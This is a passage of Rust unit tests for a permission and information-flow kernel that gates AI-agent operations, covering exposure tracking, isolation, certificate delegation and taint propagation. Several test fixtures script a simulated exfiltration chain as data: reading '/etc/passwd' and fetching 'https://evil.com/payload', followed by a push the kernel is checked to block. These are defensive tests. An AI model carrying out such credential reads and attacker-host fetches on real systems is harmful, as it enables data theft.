                spawn_agent: CapabilityLevel::Never,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();

        let mut kernel = Kernel::new(perms);

        // ReadFiles → PrivateDatan exposure
        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(d.verdict.is_allowed());
        assert!(kernel.exposure().contains(ExposureLabel::PrivateData));
        assert_eq!(kernel.exposure().count(), 1);
        assert_eq!(d.exposure_transition.pre_count, 0);
        assert_eq!(d.exposure_transition.post_count, 1);
        assert_eq!(
            d.exposure_transition.contributed_label,
            Some(ExposureLabel::PrivateData)
        );

        // WebFetch → UntrustedContent exposure
        let (d, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(d.verdict.is_allowed());
        assert!(kernel.exposure().contains(ExposureLabel::UntrustedContent));
        assert_eq!(kernel.exposure().count(), 2);
        assert_eq!(d.exposure_transition.pre_count, 1);
        assert_eq!(d.exposure_transition.post_count, 2);
    }

    #[test]
    fn test_exposure_does_not_accumulate_on_deny() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);

        // git_push=Never → denied, no exposure recorded
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        assert!(d.verdict.is_denied());
        assert_eq!(kernel.exposure().count(), 0);
        assert_eq!(d.exposure_transition.post_count, 0);
    }

    #[test]
    fn test_exposure_monotone_never_decreases() {
        use crate::capability::CapabilityLattice;
        let perms = PermissionLattice::builder()
            .description("all-read")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Always,
                edit_files: CapabilityLevel::Never,
                run_bash: CapabilityLevel::Never,
                glob_search: CapabilityLevel::Never,
                grep_search: CapabilityLevel::Never,
                web_search: CapabilityLevel::Never,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Never,
                git_push: CapabilityLevel::Never,
                create_pr: CapabilityLevel::Never,
                manage_pods: CapabilityLevel::Never,
                spawn_agent: CapabilityLevel::Never,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();

        let mut kernel = Kernel::new(perms);

        // Build up exposure
        kernel.decide(Operation::ReadFiles, "/a");
        kernel.decide(Operation::WebFetch, "https://b.com");

        // Neutral operation (WriteFiles) should not reduce exposure
        kernel.decide(Operation::WriteFiles, "/c");
        assert_eq!(kernel.exposure().count(), 2);

        // Denied operation should not reduce exposure
        kernel.decide(Operation::RunBash, "echo hi");
        assert_eq!(kernel.exposure().count(), 2);
    }

    #[test]
    fn test_dynamic_exposure_gate_blocks_exfil() {
        // Build a profile that allows ALL operations (no static obligations).
        // No uninhabitable_state obligations in the lattice because we construct one
        // without running normalize().
        use crate::capability::CapabilityLattice;
        let mut perms = PermissionLattice::builder()
            .description("everything-allowed")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Always,
                edit_files: CapabilityLevel::Always,
                run_bash: CapabilityLevel::Always,
                glob_search: CapabilityLevel::Always,
                grep_search: CapabilityLevel::Always,
                web_search: CapabilityLevel::Always,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Always,
                git_push: CapabilityLevel::Always,
                create_pr: CapabilityLevel::Always,
                manage_pods: CapabilityLevel::Always,
                spawn_agent: CapabilityLevel::Always,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();

        // Clear any obligations the builder might have added
        perms.obligations.approvals.clear();

        let mut kernel = Kernel::new(perms);

        // Step 1: Read private data → exposure PrivateData
        let (d, _token) = kernel.decide(Operation::ReadFiles, "/etc/passwd");
        assert!(d.verdict.is_allowed());

        // Step 2: Fetch untrusted content → exposure UntrustedContent
        let (d, _token) = kernel.decide(Operation::WebFetch, "https://evil.com/payload");
        assert!(d.verdict.is_allowed());

        // Step 3: Try to push → uninhabitable_state would complete → dynamic gate!
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        assert!(
            matches!(d.verdict, Verdict::RequiresApproval),
            "dynamic exposure gate should block exfil, got {:?}",
            d.verdict
        );
        assert!(d.exposure_transition.dynamic_gate_applied);

        // Exposure should NOT have advanced (operation was gated, not allowed)
        assert!(!kernel.exposure().is_uninhabitable());
        assert_eq!(kernel.exposure().count(), 2);
    }

    #[test]
    fn test_dynamic_exposure_gate_with_pre_approval() {
        use crate::capability::CapabilityLattice;
        let mut perms = PermissionLattice::builder()
            .description("everything-allowed")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Always,
                edit_files: CapabilityLevel::Always,
                run_bash: CapabilityLevel::Always,
                glob_search: CapabilityLevel::Always,
                grep_search: CapabilityLevel::Always,
                web_search: CapabilityLevel::Always,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Always,
                git_push: CapabilityLevel::Always,
                create_pr: CapabilityLevel::Always,
                manage_pods: CapabilityLevel::Always,
                spawn_agent: CapabilityLevel::Always,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();

        perms.obligations.approvals.clear();

        let mut kernel = Kernel::new(perms);

        // Pre-grant approval for the exfil operation
        kernel.grant_approval(Operation::GitPush, 1);

        // Accumulate exposure
        kernel.decide(Operation::ReadFiles, "/etc/passwd");
        kernel.decide(Operation::WebFetch, "https://evil.com/payload");

        // Push with pre-approval should be allowed through the dynamic gate
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        assert!(
            d.verdict.is_allowed(),
            "pre-approved exfil should pass dynamic gate, got {:?}",
            d.verdict
        );
        assert!(d.exposure_transition.dynamic_gate_applied);
        assert!(d.exposure_transition.state_uninhabitable);
        assert!(kernel.exposure().is_uninhabitable());
    }

    #[test]
    fn test_dynamic_exposure_gate_does_not_affect_non_exfil() {
        use crate::capability::CapabilityLattice;
        let mut perms = PermissionLattice::builder()
            .description("everything-allowed")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Always,
                edit_files: CapabilityLevel::Always,
                run_bash: CapabilityLevel::Always,
                glob_search: CapabilityLevel::Always,
                grep_search: CapabilityLevel::Always,
                web_search: CapabilityLevel::Always,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Always,
                git_push: CapabilityLevel::Always,
                create_pr: CapabilityLevel::Always,
                manage_pods: CapabilityLevel::Always,
                spawn_agent: CapabilityLevel::Always,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();

        perms.obligations.approvals.clear();

        let mut kernel = Kernel::new(perms);

        // Accumulate two legs
        kernel.decide(Operation::ReadFiles, "/etc/passwd");
        kernel.decide(Operation::WebFetch, "https://evil.com");

        // Neutral ops should still be allowed even with high exposure
        let (d, _token) = kernel.decide(Operation::WriteFiles, "/workspace/out.txt");
        assert!(d.verdict.is_allowed());
        assert!(!d.exposure_transition.dynamic_gate_applied);

        // git_commit is not an exfil op — should be allowed
        let (d, _token) = kernel.decide(Operation::GitCommit, "fix: stuff");
        assert!(d.verdict.is_allowed());
        assert!(!d.exposure_transition.dynamic_gate_applied);
    }

    #[test]
    fn test_exposure_transition_in_decision_trace() {
        use crate::capability::CapabilityLattice;
        let perms = PermissionLattice::builder()
            .description("read-only")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Never,
                edit_files: CapabilityLevel::Never,
                run_bash: CapabilityLevel::Never,
                glob_search: CapabilityLevel::Never,
                grep_search: CapabilityLevel::Never,
                web_search: CapabilityLevel::Never,
                web_fetch: CapabilityLevel::Never,
                git_commit: CapabilityLevel::Never,
                git_push: CapabilityLevel::Never,
                create_pr: CapabilityLevel::Never,
                manage_pods: CapabilityLevel::Never,
                spawn_agent: CapabilityLevel::Never,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();

        let mut kernel = Kernel::new(perms);

        kernel.decide(Operation::ReadFiles, "/a");
        kernel.decide(Operation::ReadFiles, "/b");
        kernel.decide(Operation::WriteFiles, "/c"); // denied

        let trace = kernel.trace();

        // First read: exposure 0→1
        assert_eq!(trace[0].exposure_transition.pre_count, 0);
        assert_eq!(trace[0].exposure_transition.post_count, 1);
        assert_eq!(
            trace[0].exposure_transition.contributed_label,
            Some(ExposureLabel::PrivateData)
        );

        // Second read: exposure stays at 1 (already has PrivateData)
        assert_eq!(trace[1].exposure_transition.pre_count, 1);
        assert_eq!(trace[1].exposure_transition.post_count, 1);

        // Denied write: exposure stays at 1 (denied ops don't contribute)
        assert_eq!(trace[2].exposure_transition.pre_count, 1);
        assert_eq!(trace[2].exposure_transition.post_count, 1);
    }

    #[test]
    fn test_runbash_dynamic_gate_omnibus() {
        // RunBash is special: it projects both PrivateData + ExfilVector.
        // If we've already ingested untrusted content, RunBash should
        // be dynamically gated because it's an exfil vector that would
        // complete the uninhabitable_state (it projects PrivateData too).
        use crate::capability::CapabilityLattice;
        use crate::CommandLattice;
        let mut perms = PermissionLattice::builder()
            .description("bash-and-web")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Never,
                write_files: CapabilityLevel::Never,
                edit_files: CapabilityLevel::Never,
                run_bash: CapabilityLevel::Always,
                glob_search: CapabilityLevel::Never,
                grep_search: CapabilityLevel::Never,
                web_search: CapabilityLevel::Always,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Never,
                git_push: CapabilityLevel::Never,
                create_pr: CapabilityLevel::Never,
                manage_pods: CapabilityLevel::Never,
                spawn_agent: CapabilityLevel::Never,
                extensions: std::collections::BTreeMap::new(),
            })
            .commands(CommandLattice::permissive())
            .build();

        perms.obligations.approvals.clear();

        let mut kernel = Kernel::new(perms);

        // Fetch untrusted content
        kernel.decide(Operation::WebFetch, "https://evil.com/payload");
        assert!(kernel.exposure().contains(ExposureLabel::UntrustedContent));

        // RunBash with a permitted command — uninhabitable_state would complete via omnibus
        let (d, _token) = kernel.decide(Operation::RunBash, "cargo test");
        assert!(
            matches!(d.verdict, Verdict::RequiresApproval),
            "RunBash omnibus projection should trigger dynamic gate, got {:?}",
            d.verdict
        );
        assert!(d.exposure_transition.dynamic_gate_applied);
    }

    // ── Isolation tests ─────────────────────────────────────────────

    #[test]
    fn test_isolation_minimum_met() {
        // Policy requires namespaced, runtime is MicroVM — should pass
        let perms = PermissionLattice::safe_pr_fixer()
            .with_minimum_isolation(IsolationLattice::sandboxed());
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::microvm());

        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(
            d.verdict.is_allowed(),
            "MicroVM satisfies sandboxed minimum"
        );
    }

    #[test]
    fn test_isolation_minimum_not_met() {
        // Policy requires MicroVM, runtime is localhost — should deny everything
        let perms =
            PermissionLattice::safe_pr_fixer().with_minimum_isolation(IsolationLattice::microvm());
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::localhost());

        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(
            matches!(
                d.verdict,
                Verdict::Deny(DenyReason::IsolationInsufficient { .. })
            ),
            "localhost does not satisfy MicroVM minimum, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn test_isolation_minimum_exact_match() {
        // Policy requires sandboxed, runtime is exactly sandboxed — should pass
        let perms = PermissionLattice::safe_pr_fixer()
            .with_minimum_isolation(IsolationLattice::sandboxed());
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::sandboxed());

        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(d.verdict.is_allowed(), "exact match satisfies minimum");
    }

    #[test]
    fn test_isolation_minimum_partial_fail() {
        use crate::isolation::{FileIsolation, NetworkIsolation, ProcessIsolation};

        // Policy requires MicroVM + Filtered network
        let min = IsolationLattice::new(
            ProcessIsolation::MicroVM,
            FileIsolation::Sandboxed,
            NetworkIsolation::Filtered,
        );
        let perms = PermissionLattice::safe_pr_fixer().with_minimum_isolation(min);

        // Runtime has MicroVM process but Host network — partial failure
        let runtime = IsolationLattice::new(
            ProcessIsolation::MicroVM,
            FileIsolation::Sandboxed,
            NetworkIsolation::Host,
        );
        let mut kernel = Kernel::with_isolation(perms, runtime);

        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(
            matches!(
                d.verdict,
                Verdict::Deny(DenyReason::IsolationInsufficient { .. })
            ),
            "Host network doesn't satisfy Filtered minimum"
        );
    }

    #[test]
    fn test_isolation_no_minimum_always_passes() {
        // Policy has no minimum_isolation — any runtime works
        let perms = PermissionLattice::safe_pr_fixer();
        assert!(perms.minimum_isolation.is_none());
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::localhost());

        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(
            d.verdict.is_allowed(),
            "no minimum → always passes isolation check"
        );
    }

    #[test]
    fn test_airgapped_denies_network_ops() {
        // Even with web_fetch=Always, airgapped network denies it
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::microvm());

        let (d, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(
            matches!(d.verdict, Verdict::Deny(DenyReason::IsolationGated { .. })),
            "airgapped network must deny web_fetch even if capability allows it, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn test_airgapped_denies_web_search() {
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::microvm());

        let (d, _token) = kernel.decide(Operation::WebSearch, "rust async");
        assert!(
            matches!(d.verdict, Verdict::Deny(DenyReason::IsolationGated { .. })),
            "airgapped network must deny web_search, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn test_airgapped_allows_non_network_ops() {
        // Airgapped still allows file operations and local commands
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::microvm());

        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(d.verdict.is_allowed(), "airgapped should allow file reads");

        let (d, _token) = kernel.decide(Operation::GlobSearch, "**/*.rs");
        assert!(d.verdict.is_allowed(), "airgapped should allow glob search");
    }

    #[test]
    fn test_filtered_network_allows_web_ops() {
        // Filtered network (not airgapped) should allow web operations
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::with_isolation(perms, IsolationLattice::microvm_with_network());

        let (d, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(
            d.verdict.is_allowed(),
            "filtered network should allow web_fetch, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn test_isolation_minimum_meet_takes_stronger() {
        // When two policies are combined via meet, the minimum_isolation
        // should be the join (stronger) of both
        let a =
            PermissionLattice::permissive().with_minimum_isolation(IsolationLattice::sandboxed());
        let b = PermissionLattice::permissive().with_minimum_isolation(IsolationLattice::microvm());

        let result = a.meet(&b);
        assert!(
            result.minimum_isolation.is_some(),
            "meet should preserve minimum_isolation"
        );
        let min = result.minimum_isolation.unwrap();
        // MicroVM is stronger than sandboxed on all dimensions
        assert!(min.at_least(&IsolationLattice::microvm()));
    }

    #[test]
    fn test_kernel_isolation_accessor() {
        let perms = PermissionLattice::safe_pr_fixer();
        let iso = IsolationLattice::microvm();
        let kernel = Kernel::with_isolation(perms, iso);

        assert_eq!(kernel.isolation(), &IsolationLattice::microvm());
    }

    // ── Certificate integration tests ───────────────────────────────

    #[test]
    fn test_from_certificate_creates_kernel() {
        use crate::certificate::{verify_certificate, LatticeCertificate};
        use ring::signature::{Ed25519KeyPair, KeyPair};

        let rng = ring::rand::SystemRandom::new();
        let pkcs8 = Ed25519KeyPair::generate_pkcs8(&rng).unwrap();
        let root_key = Ed25519KeyPair::from_pkcs8(pkcs8.as_ref()).unwrap();
        let root_pub = root_key.public_key().as_ref().to_vec();
        let not_after = Utc::now() + chrono::Duration::hours(8);

        let (cert, holder_key) = LatticeCertificate::mint(
            PermissionLattice::permissive(),
            "spiffe://test/human/alice".into(),
            not_after,
            &root_key,
            &rng,
        );

        let (cert, _) = cert
            .delegate(
                &PermissionLattice::restrictive(),
                "spiffe://test/agent/coder".into(),
                not_after,
                &holder_key,
                &rng,
            )
            .unwrap();

        let fingerprint = cert.fingerprint();
        let verified = verify_certificate(&cert, &root_pub, Utc::now(), 10).unwrap();
        let mut kernel = Kernel::from_certificate(verified, fingerprint);

        // Provenance is set
        let prov = kernel.provenance().unwrap();
        assert_eq!(prov.root_identity, "spiffe://test/human/alice");
        assert_eq!(prov.leaf_identity, "spiffe://test/agent/coder");
        assert_eq!(prov.chain_depth, 1);
        assert_eq!(prov.certificate_fingerprint, fingerprint);

        // Kernel makes decisions using the certificate's effective permissions
        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(d.verdict.is_allowed());
    }

    #[test]
    fn test_from_certificate_enforces_restrictions() {
        use crate::certificate::{verify_certificate, LatticeCertificate};
        use ring::signature::{Ed25519KeyPair, KeyPair};

        let rng = ring::rand::SystemRandom::new();
        let pkcs8 = Ed25519KeyPair::generate_pkcs8(&rng).unwrap();
        let root_key = Ed25519KeyPair::from_pkcs8(pkcs8.as_ref()).unwrap();
        let root_pub = root_key.public_key().as_ref().to_vec();
        let not_after = Utc::now() + chrono::Duration::hours(8);

        // Mint with permissive root
        let (cert, holder_key) = LatticeCertificate::mint(
            PermissionLattice::permissive(),
            "spiffe://test/root".into(),
            not_after,
            &root_key,
            &rng,
        );

        // Delegate to read_only
        let (cert, _) = cert
            .delegate(
                &PermissionLattice::read_only(),
                "spiffe://test/reader".into(),
                not_after,
                &holder_key,
                &rng,
            )
            .unwrap();

        let fingerprint = cert.fingerprint();
        let verified = verify_certificate(&cert, &root_pub, Utc::now(), 10).unwrap();
        let mut kernel = Kernel::from_certificate(verified, fingerprint);

        // Reading is allowed
        assert!(kernel
            .decide(Operation::ReadFiles, "/workspace/main.rs")
            .0
            .verdict
            .is_allowed());

        // Writing is denied (read_only profile)
        assert!(kernel
            .decide(Operation::GitPush, "origin/main")
            .0
            .verdict
            .is_denied());
    }

    #[test]
    fn test_kernel_without_certificate_has_no_provenance() {
        let kernel = Kernel::new(PermissionLattice::default());
        assert!(kernel.provenance().is_none());
    }

    #[test]
    fn test_from_certificate_attenuate_preserves_provenance() {
        use crate::certificate::{verify_certificate, LatticeCertificate};
        use ring::signature::{Ed25519KeyPair, KeyPair};

        let rng = ring::rand::SystemRandom::new();
        let pkcs8 = Ed25519KeyPair::generate_pkcs8(&rng).unwrap();
        let root_key = Ed25519KeyPair::from_pkcs8(pkcs8.as_ref()).unwrap();
        let root_pub = root_key.public_key().as_ref().to_vec();
        let not_after = Utc::now() + chrono::Duration::hours(8);

        let (cert, _) = LatticeCertificate::mint(
            PermissionLattice::permissive(),
            "spiffe://test/root".into(),
            not_after,
            &root_key,
            &rng,
        );

        let fingerprint = cert.fingerprint();
        let verified = verify_certificate(&cert, &root_pub, Utc::now(), 10).unwrap();
        let mut kernel = Kernel::from_certificate(verified, fingerprint);

        // Attenuate the kernel
        kernel.attenuate(&PermissionLattice::read_only()).unwrap();

        // Provenance is preserved after attenuation
        let prov = kernel.provenance().unwrap();
        assert_eq!(prov.root_identity, "spiffe://test/root");
        assert_eq!(prov.certificate_fingerprint, fingerprint);
    }

    // ── Flow control integration tests ───────────────────────────────

    #[test]
    fn flow_disabled_by_default() {
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        // Without enable_flow_control(), web + write should work fine
        let (d1, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(matches!(d1.verdict, Verdict::Allow));
        let (d2, _) = kernel.decide(Operation::WriteFiles, "/tmp/test.txt");
        assert!(matches!(d2.verdict, Verdict::Allow));
    }

    #[test]
    fn flow_web_then_write_blocked() {
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();

        // WebFetch taints the session with Adversarial + NoAuthority
        let (d1, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(matches!(d1.verdict, Verdict::Allow));

        // WriteFiles now blocked — NoAuthority < Suggestive
        let (d2, _) = kernel.decide(Operation::WriteFiles, "/tmp/test.txt");
        assert!(
            matches!(d2.verdict, Verdict::Deny(DenyReason::FlowViolation { .. })),
            "Expected FlowViolation, got {:?}",
            d2.verdict
        );
    }

    #[test]
    fn flow_web_then_read_allowed() {
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();

        // WebFetch taints session
        let (d1, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(matches!(d1.verdict, Verdict::Allow));

        // ReadFiles still allowed — only requires Informational authority
        let (d2, _) = kernel.decide(Operation::ReadFiles, "/tmp/test.txt");
        assert!(matches!(d2.verdict, Verdict::Allow));
    }

    #[test]
    fn flow_pure_user_actions_allowed() {
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();

        // Pure user-directed actions (no web taint) should pass flow checks.
        // Some ops may require approval from legacy checks — that's fine,
        // we just verify they're not denied by FlowViolation.
        let (d1, _) = kernel.decide(Operation::ReadFiles, "/src/main.rs");
        assert!(matches!(d1.verdict, Verdict::Allow));
        let (d2, _) = kernel.decide(Operation::WriteFiles, "/tmp/out.txt");
        assert!(matches!(d2.verdict, Verdict::Allow));
        let (d3, _) = kernel.decide(Operation::GitCommit, "fix: typo");
        assert!(matches!(d3.verdict, Verdict::Allow));
        // CreatePr may require approval via legacy static check — that's OK.
        // What matters is it's NOT a FlowViolation.
        let (d4, _) = kernel.decide(Operation::CreatePr, "fix typo");
        assert!(
            !matches!(d4.verdict, Verdict::Deny(DenyReason::FlowViolation { .. })),
            "CreatePr should not be a flow violation: {:?}",
            d4.verdict
        );
    }

    #[test]
    fn flow_check_runs_before_approvals() {
        let mut perms = PermissionLattice::permissive();
        // Force GitPush to require approval
        perms.capabilities.git_push = CapabilityLevel::LowRisk;
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();

        // Pre-grant approval for GitPush
        kernel.grant_approval(Operation::GitPush, 1);

        // Taint session with web content
        let (d1, _) = kernel.decide(Operation::WebFetch, "https://evil.com");
        assert!(matches!(d1.verdict, Verdict::Allow));

        // GitPush should be DENIED by flow check even with pre-granted approval
        let (d2, _) = kernel.decide(Operation::GitPush, "origin main");
        assert!(
            matches!(d2.verdict, Verdict::Deny(DenyReason::FlowViolation { .. })),
            "Flow check must run before approval path! Got {:?}",
            d2.verdict
        );
    }

    // --- Causal DAG integration tests (step 6 of bright-knitting-mitten) ---

    #[test]
    fn dag_independent_branches_no_overtaint() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        // Task A: web content (adversarial)
        let web_id = kernel
            .observe(portcullis_core::flow::NodeKind::WebContent, &[])
            .unwrap();
        // Task B: local file (trusted) — NO dependency on web
        let file_id = kernel
            .observe(portcullis_core::flow::NodeKind::FileRead, &[])
            .unwrap();

        // Task B write depends ONLY on file — ALLOWED
        let (d, _) = kernel.decide_with_parents(Operation::WriteFiles, "/out.txt", &[file_id]);
        assert!(
            d.verdict.is_allowed(),
            "File-only write should be allowed, got {:?}",
            d.verdict
        );
        assert!(d.flow_node_id.is_some());

        // Task A write depends on web — DENIED
        let (d, _) = kernel.decide_with_parents(Operation::WriteFiles, "/web.txt", &[web_id]);
        assert!(
            d.verdict.is_denied(),
            "Web-tainted write should be denied, got {:?}",
            d.verdict
        );
        assert!(matches!(
            d.verdict,
            Verdict::Deny(DenyReason::FlowViolation { .. })
        ));
    }

    #[test]
    fn dag_transitive_taint_propagation() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let web = kernel
            .observe(portcullis_core::flow::NodeKind::WebContent, &[])
            .unwrap();
        // Model plan derived from web content
        let plan = kernel
            .observe(portcullis_core::flow::NodeKind::ModelPlan, &[web])
            .unwrap();

        // Write depending on plan (transitively depends on web) — DENIED
        let (d, _) = kernel.decide_with_parents(Operation::WriteFiles, "/derived.txt", &[plan]);
        assert!(
            d.verdict.is_denied(),
            "Transitive web taint should propagate, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn dag_clean_chain_allowed() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let user = kernel
            .observe(portcullis_core::flow::NodeKind::UserPrompt, &[])
            .unwrap();
        let file = kernel
            .observe(portcullis_core::flow::NodeKind::FileRead, &[user])
            .unwrap();
        let plan = kernel
            .observe(portcullis_core::flow::NodeKind::ModelPlan, &[file])
            .unwrap();

        // Write depending on clean chain: user → file → plan — ALLOWED
        let (d, token) = kernel.decide_with_parents(Operation::WriteFiles, "/clean.txt", &[plan]);
        assert!(d.verdict.is_allowed());
        assert!(token.is_some());
        assert!(d.flow_node_id.is_some());
    }

    #[test]
    fn dag_denied_action_produces_receipt() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let web = kernel
            .observe(portcullis_core::flow::NodeKind::WebContent, &[])
            .unwrap();

        let (d, _) = kernel.decide_with_parents(Operation::CreatePr, "my-pr", &[web]);
        assert!(d.verdict.is_denied());
        match &d.verdict {
            Verdict::Deny(DenyReason::FlowViolation { receipt, .. }) => {
                assert!(
                    receipt.is_some(),
                    "Denied DAG action should include receipt"
                );
                assert!(
                    receipt.as_ref().unwrap().contains("BLOCKED"),
                    "Receipt should contain BLOCKED"
                );
            }
            other => panic!("Expected FlowViolation, got {:?}", other),
        }
    }

    #[test]
    fn dag_fallback_without_enable() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        // Don't call enable_flow_graph() — decide_with_parents should fall back to decide()

        let (d, _) = kernel.decide_with_parents(Operation::ReadFiles, "/workspace/main.rs", &[]);
        assert!(d.verdict.is_allowed());
        assert!(d.flow_node_id.is_none(), "No DAG → no flow_node_id");
    }

    #[test]
    fn dag_capability_check_still_applies() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let user = kernel
            .observe(portcullis_core::flow::NodeKind::UserPrompt, &[])
            .unwrap();

        // DAG says allow (clean parents), but capability lattice says never for GitPush
        let (d, _) = kernel.decide_with_parents(Operation::GitPush, "origin/main", &[user]);
        assert!(
            d.verdict.is_denied(),
            "Capability check should still apply even when DAG allows, got {:?}",
            d.verdict
        );
        assert!(matches!(
            d.verdict,
            Verdict::Deny(DenyReason::InsufficientCapability)
        ));
    }

    #[test]
    fn dag_bypasses_flat_flow_label() {
        // Issue #365: when both flow systems are enabled, the DAG should
        // supersede the flat label — not double-deny.
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control(); // flat label
        kernel.enable_flow_graph(); // DAG

        // Read web content — taints the flat session label
        let _web = kernel
            .observe(portcullis_core::flow::NodeKind::WebContent, &[])
            .unwrap();
        // Also taint the flat label via a regular decide()
        let (d, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(d.verdict.is_allowed());

        // Now use the DAG with clean parents — should be allowed
        // even though the flat label is tainted
        let file = kernel
            .observe(portcullis_core::flow::NodeKind::FileRead, &[])
            .unwrap();
        let (d, _) = kernel.decide_with_parents(Operation::WriteFiles, "/clean.txt", &[file]);
        assert!(
            d.verdict.is_allowed(),
            "DAG clean parents should override flat taint, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn dag_observe_returns_error_without_enable() {
        // Issue #364: observe() should return Err, not panic
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        let result = kernel.observe(portcullis_core::flow::NodeKind::FileRead, &[]);
        assert!(result.is_err());
    }

    #[test]
    fn dag_declassification_allows_validated_tool() {
        use portcullis_core::declassify::{DeclassificationRule, DeclassifyAction};
        use portcullis_core::IntegLevel;

        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        // Add declassification rule: search API output gets Adversarial → Untrusted
        kernel.add_declassification_rule(DeclassificationRule {
            action: DeclassifyAction::RaiseIntegrity {
                from: IntegLevel::Adversarial,
                to: IntegLevel::Untrusted,
            },
            justification: "Search API returns curated content",
        });

        // Observe web content — normally Adversarial/NoAuthority
        let web = kernel
            .observe(portcullis_core::flow::NodeKind::WebContent, &[])
            .unwrap();

        // Without declassification, web content → write would be DENIED
        // (NoAuthority cannot steer privileged actions).
        // But the rule raised integrity from Adversarial → Untrusted.
        // Authority is still NoAuthority, so writes are still denied by
        // the authority check. This verifies declassification fires but
        // doesn't grant more than it should.
        let (d, _) = kernel.decide_with_parents(Operation::WriteFiles, "/out.txt", &[web]);
        assert!(
            d.verdict.is_denied(),
            "Authority is still NoAuthority — write should be denied even with raised integrity"
        );
    }

    #[test]
    fn dag_declassification_authority_upgrade() {
        use portcullis_core::declassify::{DeclassificationRule, DeclassifyAction};
        use portcullis_core::AuthorityLevel;

        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        // Raise authority: Informational → Suggestive (for curated tool output)
        // ToolResponse starts at Informational authority
        kernel.add_declassification_rule(DeclassificationRule {
            action: DeclassifyAction::RaiseAuthority {
                from: AuthorityLevel::Informational,
                to: AuthorityLevel::Suggestive,
            },
            justification: "Tool output from validated API",
        });

        // Also raise integrity so both checks pass
        kernel.add_declassification_rule(DeclassificationRule {
            action: DeclassifyAction::RaiseIntegrity {
                from: portcullis_core::IntegLevel::Adversarial,
                to: portcullis_core::IntegLevel::Untrusted,
            },
            justification: "Validated API output",
        });

        let tool = kernel
            .observe(portcullis_core::flow::NodeKind::ToolResponse, &[])
            .unwrap();

